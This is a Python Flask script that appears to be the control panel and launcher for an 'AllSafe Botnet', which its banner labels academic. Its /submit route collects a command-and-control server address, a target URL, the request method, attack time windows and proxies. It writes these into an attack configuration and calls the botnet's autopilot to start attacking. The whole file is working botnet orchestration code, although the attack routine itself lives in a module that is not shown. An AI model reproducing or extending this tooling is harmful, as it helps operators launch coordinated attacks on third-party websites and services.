#!/usr/bin/python3
"""
This is the startup script for the botnet. Please note that the software is developed under.
Python 3.4.x version of the interpreter.

Authors:    Alessio "Tyrell" Moretti & Federico "Elliot" Vagnoni
Version:    0.1.0
Created:    24 October 2016
Modified:   14 January 2017
"""

from flask import Flask
from flask import render_template
from flask import request
from flask import abort
from flask import redirect
from time import time
import requests
from requests.auth import HTTPBasicAuth
import json
import Botnet
from collections import OrderedDict
from utils.config import rootSchema, targetSchema, requestSchema


app = Flask(__name__)

"""
The Botnet will use a simple implementation of a micro WebServer using Flask

It will receive HTTP request in both GET and POST method on the root page.

If the method is POST, a login request is assumed and the login process will be performed;
if the process fails an error message will be returned; if it will succed the amdin page will be returned.

If the method is GET, the login form will be shown.
"""
@app.route("/", methods=['GET', 'POST'])
def showControlPage():
    return render_template("localcontrolpage.html")

"""
In the controlpage you can submit a new request of two different type: upload or attack.

Upload has not subtypes. It only allows to prepare the configuration file that will be used
to performa local or a remote attack using the json file given as example.

Attack has two subtypes: local or remote. The former will use the AllSafeBotnet class (defined in Worker.py) to carry
the attack using the override parameter set to True, while the latter will use the same method with the override param
set to False.
"""
@app.route("/submit", methods=['POST'])
def performAttack():
    if 'attack' in request.json:
        if request.json['attack'] == 'begin':
            print(request.json)
            # retrieving and polishing C&C server and prepare config file
            cc_server = prepareConfigFile(request.json)
            if '://' not in cc_server:
                cc_server = 'http://' + cc_server
            allsafe = Botnet.AllSafeBotnet()
            allsafe.autopilot(cc_server, './data/current_attack.json', 5, override=False)
            return "OK", 200
        else:
            print(request.json['attack'])
            return "Invalid request", 402
    else:
        print(request.json)
        return "Forbidden!", 403

def prepareConfigFile(params, where='./data/current_attack.json'):

    localRootSchema = rootSchema

    # Only the useful key values will be changed accordingly
    localRootSchema['last_modified'] = round(time())
    localRootSchema['cc_server'] = params['cc_server']

    # Creation of the locaTargetSchema based upon the TargetSchema
    localTargetSchema = targetSchema
    localTargetSchema['period'] = params['period']
    localTargetSchema['max_count'] = params['max_count']

    # Creation of the actionCondition dictionary
    actionConditions = OrderedDict()

    # If AMPM has been choosen both AM and PM will be set on 1
    ampm = params['AMPM'];
    if ampm == "AM":
        actionConditions['AM'] = 1
    if ampm == "PM":
        actionConditions['PM'] = 1
    if ampm == "AMPM":
        actionConditions['AM'] = 1
        actionConditions['PM'] = 1

    actionConditions['attack_time'] = params['hour_start'] + "-" + params['hour_end']
    actionConditions['avoid_week'] = params['avoid_week']
    actionConditions['avoid_month'] = params['avoid_month']

    # ActionConditions is now poart of the localTargetSchema
    localTargetSchema['action_conditions'] = actionConditions

    # Creation of the requestSchema
    localRequestSchema = requestSchema
    localRequestSchema['method'] = params['method']
    localRequestSchema['url'] = params['url']
    localRequestSchema['resources'] = params['resources']
    localRequestSchema['encoding'] = params['encoding']

    # Creation of the proxy dictionary
    proxy = OrderedDict()

    # If an element has been specified as https, it will be handeld properly
    for proxy_elem in params['proxy']:
        if "https://" in proxy_elem:
            proxy['https'] = proxy_elem
        else:
            proxy['http'] = proxy_elem

    # Proxy is now part of localRequestSchema
    localRequestSchema['proxy_server'] = proxy

    # Final combination of the three schemas
    localTargetSchema['request_params'] = localRequestSchema
    localRootSchema['targets'].append(localTargetSchema)

    #The json configuration will be written
    file = open(where, "w")
    file.write(json.dumps(localRootSchema,indent=4))
    file.close()
    return params['cc_server']



if __name__ == "__main__":
    print("-------------------------------------------------------------")
    print("            ALLSAFE BOTNET - Academic purpose only           ")
    print("                          v. 0.1.0                           ")
    print("\nDeveloped with no harmful intentions and love by:          ")
    print("  - Alessio 'Tyrell' Moretti                                 ")
    print("  - Federico 'Elliot' Vagnoni                                ")
    print("-------------------------------------------------------------")
    app.run(host='0.0.0.0', port=4042)
